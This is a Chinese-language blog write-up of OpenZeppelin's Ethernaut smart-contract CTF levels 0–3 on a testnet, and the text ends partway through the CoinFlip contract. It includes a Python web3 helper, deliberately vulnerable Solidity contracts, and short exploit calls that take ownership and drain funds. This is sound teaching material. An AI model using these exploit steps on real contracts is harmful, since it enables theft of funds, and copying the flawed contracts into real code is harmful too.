<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ETH openzeppelin 题解 | Clovershrub</title><meta name="author" content="Clovershrub"><meta name="copyright" content="Clovershrub"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ETH openzeppelin 题解 前期准备 题目网址：https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F; 水龙头：https:&#x2F;&#x2F;holesky-faucet.pk910.de&#x2F;#&#x2F; 查询器：https:&#x2F;&#x2F;holesky.etherscan.io&#x2F; 交互器： 12345678910111213141516171819202122232425262728293031323">
<meta property="og:type" content="article">
<meta property="og:title" content="ETH openzeppelin 题解">
<meta property="og:url" content="https://clovershrub.github.io/2025/06/19/ETH%20openzeppelin%20%E9%A2%98%E8%A7%A3/index.html">
<meta property="og:site_name" content="Clovershrub">
<meta property="og:description" content="ETH openzeppelin 题解 前期准备 题目网址：https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F; 水龙头：https:&#x2F;&#x2F;holesky-faucet.pk910.de&#x2F;#&#x2F; 查询器：https:&#x2F;&#x2F;holesky.etherscan.io&#x2F; 交互器： 12345678910111213141516171819202122232425262728293031323">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://clovershrub.github.io/img/ETHopenzeppelin%E9%A2%98%E8%A7%A3/cover.jpg">
<meta property="article:published_time" content="2025-06-18T16:00:00.000Z">
<meta property="article:modified_time" content="2025-06-19T14:10:04.067Z">
<meta property="article:author" content="Clovershrub">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://clovershrub.github.io/img/ETHopenzeppelin%E9%A2%98%E8%A7%A3/cover.jpg"><link rel="shortcut icon" href="/img/blogs/avatar.jpg"><link rel="canonical" href="https://clovershrub.github.io/2025/06/19/ETH%20openzeppelin%20%E9%A2%98%E8%A7%A3/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ETH openzeppelin 题解',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-06-19 22:10:04'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Clovershrub" type="application/atom+xml">
<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/blogs/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/ETHopenzeppelin%E9%A2%98%E8%A7%A3/cover.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Clovershrub"></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ETH openzeppelin 题解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">Created</span><time datetime="2025-06-18T16:00:00.000Z" title="Created 2025-06-19 00:00:00">2025-06-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ETH openzeppelin 题解"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="eth-openzeppelin-题解">ETH openzeppelin 题解</h1>
<h2 id="前期准备">前期准备</h2>
<p>题目网址：<a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/">https://ethernaut.openzeppelin.com/</a></p>
<p>水龙头：<a target="_blank" rel="noopener" href="https://holesky-faucet.pk910.de/#/">https://holesky-faucet.pk910.de/#/</a></p>
<p>查询器：<a target="_blank" rel="noopener" href="https://holesky.etherscan.io/">https://holesky.etherscan.io/</a></p>
<p>交互器：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">from</span> web3.contract <span class="keyword">import</span> Contract</span><br><span class="line"><span class="keyword">import</span> solcx</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BCI</span>:</span><br><span class="line">    web3            : Web3</span><br><span class="line">    contract        : Contract</span><br><span class="line">    ContractAddress : <span class="built_in">str</span></span><br><span class="line">    MyWalletAddress : <span class="built_in">str</span></span><br><span class="line">    PrivateKey      : <span class="built_in">str</span></span><br><span class="line">    SolidityFile    : <span class="built_in">str</span></span><br><span class="line">    ContractName    : <span class="built_in">str</span></span><br><span class="line">    SolidityVersion : <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rpc : <span class="built_in">str</span>, ContractAddress : <span class="built_in">str</span>, MyWalletAddress : <span class="built_in">str</span>, PrivateKey : <span class="built_in">str</span>, SolidityFile : <span class="built_in">str</span>, ContractName : <span class="built_in">str</span>, SolidityVersion : <span class="built_in">str</span></span>):</span><br><span class="line">        self.web3            = Web3(HTTPProvider(rpc))</span><br><span class="line">        self.ContractAddress = ContractAddress</span><br><span class="line">        self.MyWalletAddress = MyWalletAddress</span><br><span class="line">        self.PrivateKey      = PrivateKey</span><br><span class="line">        self.SolidityFile    = SolidityFile</span><br><span class="line">        self.ContractName    = ContractName</span><br><span class="line">        self.SolidityVersion = SolidityVersion</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">CompileContract</span>(<span class="params">self</span>):</span><br><span class="line">        solcx.set_solc_version(self.SolidityVersion)</span><br><span class="line">        temp_file = solcx.compile_files(</span><br><span class="line">            self.SolidityFile,</span><br><span class="line">            output_values=[<span class="string">&#x27;abi&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>]</span><br><span class="line">        )</span><br><span class="line">        abi = temp_file[self.SolidityFile + <span class="string">&#x27;:&#x27;</span> + self.ContractName][<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">        <span class="built_in">bin</span> = temp_file[self.SolidityFile + <span class="string">&#x27;:&#x27;</span> + self.ContractName][<span class="string">&#x27;bin&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> abi, <span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">DeployContract</span>(<span class="params">self, Parameters : <span class="built_in">list</span>, Value : <span class="built_in">float</span> = <span class="number">0</span></span>):</span><br><span class="line">        abi, <span class="built_in">bin</span> = self.CompileContract()</span><br><span class="line">        MyContract = self.web3.eth.contract(abi = abi, bytecode = <span class="built_in">bin</span>)</span><br><span class="line">        tx = MyContract.constructor(*Parameters).build_transaction(&#123;</span><br><span class="line">            <span class="string">&#x27;chainId&#x27;</span> : self.web3.eth.chain_id,</span><br><span class="line">            <span class="string">&#x27;from&#x27;</span>    : self.MyWalletAddress,</span><br><span class="line">            <span class="string">&#x27;nonce&#x27;</span>   : self.web3.eth.get_transaction_count(self.MyWalletAddress),</span><br><span class="line">            <span class="string">&#x27;value&#x27;</span>   : self.web3.to_wei(Value, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;gas&#x27;</span>     : <span class="number">10000000</span>,</span><br><span class="line">            <span class="string">&#x27;gasPrice&#x27;</span>: self.web3.eth.gas_price + <span class="number">5000</span></span><br><span class="line">        &#125;)</span><br><span class="line">        SignedTransaction = self.web3.eth.account.sign_transaction(tx, self.PrivateKey)</span><br><span class="line">        TransactionHash = self.web3.eth.send_raw_transaction(SignedTransaction.raw_transaction)</span><br><span class="line">        TransactionReceipt =  self.web3.eth.wait_for_transaction_receipt(TransactionHash)</span><br><span class="line">        <span class="keyword">return</span> TransactionReceipt[<span class="string">&#x27;contractAddress&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetContract</span>(<span class="params">self</span>):</span><br><span class="line">        abi, _ = self.CompileContract()</span><br><span class="line">        self.contract = self.web3.eth.contract(address = self.ContractAddress, abi = abi)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">PayableCall</span>(<span class="params">self, FunctionName : <span class="built_in">str</span>, Parameters : <span class="built_in">list</span>, Value : <span class="built_in">float</span> = <span class="number">0</span></span>):</span><br><span class="line">        tx = <span class="built_in">getattr</span>(self.contract.functions, FunctionName)(*Parameters).build_transaction(&#123;</span><br><span class="line">            <span class="string">&#x27;chainId&#x27;</span> : self.web3.eth.chain_id,</span><br><span class="line">            <span class="string">&#x27;from&#x27;</span>    : self.MyWalletAddress,</span><br><span class="line">            <span class="string">&#x27;nonce&#x27;</span>   : self.web3.eth.get_transaction_count(self.MyWalletAddress),</span><br><span class="line">            <span class="string">&#x27;value&#x27;</span>   : self.web3.to_wei(Value, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;gas&#x27;</span>     : <span class="number">1000000</span>,</span><br><span class="line">            <span class="string">&#x27;gasPrice&#x27;</span>: self.web3.eth.gas_price + <span class="number">5000</span></span><br><span class="line">        &#125;)</span><br><span class="line">        SignedTransaction = self.web3.eth.account.sign_transaction(tx, self.PrivateKey)</span><br><span class="line">        TransactionHash = self.web3.eth.send_raw_transaction(SignedTransaction.raw_transaction)</span><br><span class="line">        self.web3.eth.wait_for_transaction_receipt(TransactionHash)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ViewCall</span>(<span class="params">self, FunctionName : <span class="built_in">str</span>, Parameters : <span class="built_in">list</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(self.contract.functions, FunctionName)(*Parameters).call(&#123;<span class="string">&#x27;from&#x27;</span>: self.MyWalletAddress&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Transfer</span>(<span class="params">self, Value : <span class="built_in">float</span> = <span class="number">0</span></span>):</span><br><span class="line">        tx = &#123;</span><br><span class="line">            <span class="string">&#x27;chainId&#x27;</span> : self.web3.eth.chain_id,</span><br><span class="line">            <span class="string">&#x27;from&#x27;</span>    : self.MyWalletAddress,</span><br><span class="line">            <span class="string">&#x27;to&#x27;</span>      : self.ContractAddress,</span><br><span class="line">            <span class="string">&#x27;nonce&#x27;</span>   : self.web3.eth.get_transaction_count(self.MyWalletAddress),</span><br><span class="line">            <span class="string">&#x27;value&#x27;</span>   : self.web3.to_wei(Value, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;gas&#x27;</span>     : <span class="number">10000000</span>,</span><br><span class="line">            <span class="string">&#x27;gasPrice&#x27;</span>: self.web3.eth.gas_price + <span class="number">5000</span></span><br><span class="line">        &#125;</span><br><span class="line">        SignedTransaction = self.web3.eth.account.sign_transaction(tx, self.PrivateKey)</span><br><span class="line">        TransactionHash = self.web3.eth.send_raw_transaction(SignedTransaction.raw_transaction)</span><br><span class="line">        self.web3.eth.wait_for_transaction_receipt(TransactionHash)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetBalance</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.web3.from_wei(self.web3.eth.get_balance(self.ContractAddress), <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ViewStorage</span>(<span class="params">self, Index : <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.web3.eth.get_storage_at(self.ContractAddress, Index)</span><br></pre></td></tr></table></figure>
<h2 id="level0">level0</h2>
<p>根据提示一点点运行命令即可，最终得到合约代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line">    string public password;</span><br><span class="line">    uint8 public infoNum = 42;</span><br><span class="line">    string public theMethodName = &quot;The method name is method7123949.&quot;;</span><br><span class="line">    bool private cleared = false;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(string memory _password) &#123;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;You will find what you need in info1().&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info1() public pure returns (string memory) &#123;</span><br><span class="line">        return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&quot;hello&quot;))) &#123;</span><br><span class="line">            return &quot;The property infoNum holds the number of the next info method to call.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Wrong parameter.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info42() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;theMethodName is the name of the next method.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;If you know the password, submit it to authenticate().&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate(string memory passkey) public &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">            cleared = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getCleared() public view returns (bool) &#123;</span><br><span class="line">        return cleared;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level1-fallback">level1 Fallback</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>高版本solidity拥有fallback()和receive()两个默认函数，分别处理无转账和有转账但是没调用任何函数的情况。先使用contribute()函数让contributions[me]中有东西，在给他随便转点钱，就能通过receive()函数让自己变成owner，最后使用withdraw()函数即可转走合约内全部的钱。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract = GetContract()</span><br><span class="line">PayableCall(<span class="string">&#x27;contribute&#x27;</span>, [], <span class="number">0.0001</span>)</span><br><span class="line">Transfer()</span><br><span class="line"><span class="built_in">print</span>(contract.functions.owner().call(&#123;<span class="string">&#x27;from&#x27;</span>: MyWalletAddress&#125;))</span><br><span class="line">PayableCall(<span class="string">&#x27;withdraw&#x27;</span>, [], <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h2 id="level2-fallout">level2 Fallout</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;./SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>合约名为<code>Fallout</code>但其构造函数却错误地命名为<code>Fal1out</code>，导致任何人均可以调用这个函数，从而修改owner。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract = GetContract()</span><br><span class="line">PayableCall(<span class="string">&#x27;Fal1out&#x27;</span>, [])</span><br><span class="line"><span class="built_in">print</span>(contract.functions.owner().call(&#123;<span class="string">&#x27;from&#x27;</span>: MyWalletAddress&#125;))</span><br></pre></td></tr></table></figure>
<h2 id="level3-coin-flip">level3 Coin Flip</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    